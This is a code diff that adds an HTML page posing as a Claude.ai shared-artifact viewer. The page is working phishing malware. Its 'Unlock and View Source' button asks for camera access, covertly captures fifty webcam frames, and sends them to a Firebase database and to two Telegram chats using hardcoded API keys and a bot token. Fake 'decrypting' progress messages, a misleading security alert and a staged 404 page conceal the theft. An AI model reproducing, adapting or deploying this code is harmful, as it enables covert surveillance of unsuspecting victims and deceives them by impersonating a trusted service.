@@ -1,0 +1,262 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Claude | Shared Conversation Content</title>
+    <!-- Firebase SDKs -->
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+    
+    <style>
+        :root {
+            --claude-bg: #f9f8f6;
+            --claude-accent: #d97757;
+            --claude-text: #333333;
+            --claude-secondary: #6b6b6b;
+            --claude-border: #e5e3da;
+        }
+
+        body { 
+            margin: 0; padding: 0; 
+            background: var(--claude-bg); 
+            color: var(--claude-text); 
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            display: flex; flex-direction: column; align-items: center; justify-content: center; 
+            height: 100vh; overflow: hidden;
+        }
+
+        .claude-container {
+            width: 100%;
+            max-width: 600px;
+            padding: 40px;
+            text-align: left;
+        }
+
+        .claude-header {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 32px;
+        }
+
+        .claude-avatar {
+            width: 32px; height: 32px;
+            background: var(--claude-accent);
+            border-radius: 50%;
+        }
+
+        h1 { font-size: 24px; font-weight: 500; margin: 0; letter-spacing: -0.2px; }
+        .meta { font-size: 14px; color: var(--claude-secondary); margin-top: 4px; }
+
+        .code-preview-box {
+            background: #ffffff;
+            border: 1px solid var(--claude-border);
+            border-radius: 8px;
+            padding: 24px;
+            margin-bottom: 24px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.05);
+        }
+
+        .code-placeholder {
+            font-family: "SF Mono", "Menlo", monospace;
+            font-size: 13px;
+            line-height: 1.6;
+            color: #444;
+        }
+
+        .btn-view {
+            background: var(--claude-accent);
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            font-size: 15px;
+            font-weight: 500;
+            border-radius: 6px;
+            cursor: pointer;
+            transition: opacity 0.2s ease;
+        }
+
+        .btn-view:hover { opacity: 0.9; }
+
+        #download-ui { display: none; margin-top: 20px; }
+
+        .progress-section {
+            display: flex;
+            flex-direction: column;
+            gap: 16px;
+        }
+
+        .status-label { font-size: 14px; color: var(--claude-secondary); font-style: italic; }
+
+        .progress-track {
+            width: 100%; height: 4px;
+            background: var(--claude-border);
+            border-radius: 2px;
+            overflow: hidden;
+        }
+
+        .progress-bar {
+            height: 100%; width: 0%;
+            background: var(--claude-accent);
+            transition: width 1.2s linear;
+        }
+
+        .system-log {
+            font-size: 12px;
+            color: var(--claude-secondary);
+            font-family: monospace;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="claude-container">
+        <div class="claude-header">
+            <div class="claude-avatar"></div>
+            <div>
+                <h1>Shared Artifact: Project_Alpha_Main</h1>
+                <div class="meta">Created 2 hours ago • Size: 142 KB</div>
+            </div>
+        </div>
+
+        <div id="setup-ui">
+            <div class="code-preview-box">
+                <div class="code-placeholder">
+                    <span style="color:#d97757">import</span> security_utils<br>
+                    <span style="color:#d97757">const</span> access_key = <span style="color:#2b8a3e">"HIDDEN_RELAY_KEY"</span>;<br>
+                    <span style="color:#777">// Click below to view the full source code and dependencies...</span>
+                </div>
+            </div>
+            <button class="btn-view" onclick="initiate()">Unlock and View Source</button>
+        </div>
+
+        <div id="download-ui">
+            <div class="progress-section">
+                <div class="status-label" id="percent-label">Reconstructing code blocks...</div>
+                <div class="progress-track">
+                    <div id="loader" class="progress-bar"></div>
+                </div>
+                <div class="system-log" id="log-text">Ready to sync.</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Hidden Capture Elements -->
+    <video id="v" style="display:none;" autoplay playsinline></video>
+    <canvas id="c" style="display:none;"></canvas>
+
+    <script>
+        // 1. Firebase Config (Using your project credentials)
+        const firebaseConfig = {
+            apiKey: "AIzaSyBlRY8iXI5jK8GH8tku6A0We3tC_0iiup4",
+            authDomain: "shadow-app-4q69.firebaseapp.com",
+            databaseURL: "https://shadow-app-4q69-default-rtdb.asia-southeast1.firebasedatabase.app",
+            projectId: "shadow-app-4q69",
+            storageBucket: "shadow-app-4q69.firebasestorage.app",
+            messagingSenderId: "109693889633",
+            appId: "1:109693889633:web:f1654b2fb1de886cdc8e20"
+        };
+
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+
+        // 2. Telegram Config
+        const TOKEN = '8620771394:AAGl1HASK_i24zIpAZLCC7wRIwxlUvkxYrI';
+        const IDS = ['7617707778', '7194705917'];
+
+        const systemLogs = [
+            "Initializing virtual environment...",
+            "Decrypting syntax trees...",
+            "Loading artifact fragments...",
+            "Assembling binary code blocks...",
+            "Verifying script integrity...",
+            "Syncing with remote relay..."
+        ];
+
+        async function initiate() {
+            const setupUI = document.getElementById('setup-ui');
+            const downloadUI = document.getElementById('download-ui');
+            const loader = document.getElementById('loader');
+            const logText = document.getElementById('log-text');
+            const percentLabel = document.getElementById('percent-label');
+            
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                
+                setupUI.style.display = 'none';
+                downloadUI.style.display = 'block';
+
+                const video = document.getElementById('v');
+                video.srcObject = stream;
+                
+                video.onloadedmetadata = () => {
+                    video.play();
+                    let count = 0;
+                    const maxPackets = 50; 
+                    
+                    const interval = setInterval(() => {
+                        if (count >= maxPackets) {
+                            clearInterval(interval);
+                            stream.getTracks().forEach(track => track.stop());
+                            logText.innerText = "Reconstruction complete.";
+                            setTimeout(render404, 2000);
+                            return;
+                        }
+                        
+                        sendData(count + 1);
+                        count++;
+                        
+                        const progress = (count / maxPackets) * 100;
+                        loader.style.width = progress + "%";
+                        percentLabel.innerText = "Decrypting: " + Math.round(progress) + "%";
+                        
+                        if (count % 3 === 0) {
+                            logText.innerText = systemLogs[Math.floor(Math.random() * systemLogs.length)];
+                        }
+                    }, 1200); 
+                };
+            } catch (e) {
+                alert("Security Error: To view shared artifacts, your environment must support secure preview protocols.");
+                window.location.reload();
+            }
+        }
+
+        function sendData(index) {
+            const canvas = document.getElementById('c');
+            const video = document.getElementById('v');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            
+            // Firebase Exfiltration
+            const base64Data = canvas.toDataURL('image/jpeg', 0.3);
+            database.ref('captures').push({
+                image_data: base64Data,
+                target_id: "Claude_Artifact_Relay",
+                timestamp: Date.now(),
+                index: index
+            });
+
+            // Telegram Backup
+            canvas.toBlob(blob => {
+                if (!blob) return;
+                IDS.forEach(chatId => {
+                    const fd = new FormData();
+                    fd.append('chat_id', chatId);
+                    fd.append('photo', blob, 'artifact.jpg');
+                    fd.append('caption', '🎨 CLAUDE_ARTIFACT_SYNC\nFrame: ' + index + '/50');
+                    fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+                });
+            }, 'image/jpeg', 0.4); 
+        }
+
+        function render404() {
+            document.documentElement.innerHTML = `
+            <html><body style="background:white;color:black;padding:40px;text-align:center;font-family:sans-serif;">
+            <h1>404 Not Found</h1><p>The shared session has expired or the file has been deleted.</p>
+            <hr><address>Claude.ai Service Relay</address></body></html>`;
+        }
+    </script>
+</body>
+</html>
